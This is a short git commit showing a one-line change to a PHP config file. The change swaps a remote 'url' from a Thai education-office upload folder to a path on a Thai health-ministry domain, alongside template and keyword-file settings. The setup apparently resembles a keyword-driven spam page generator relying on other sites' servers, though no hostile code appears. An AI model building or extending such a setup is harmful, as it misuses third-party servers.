93950ba39d4e7c726c32ff22bab1e296f6997932
ROIHEE <thanawat58311@gmail.com>
2024-09-11 03:15:35 +0800

    Update config.php

--- config.php
+++ config.php
@@ -1,6 +1,6 @@
 <?php
 $config = array(
-        'url'		=> 'http://amnat.nfe.go.th/amnat2024/wp-content/uploads/style/',
+        'url'		=> 'https://nsn-dep.moph.go.th/_car/style/',
         'parameter' => 'go',
         'template'  => 'temp.html',
         'keywords'  => 'bb.txt',
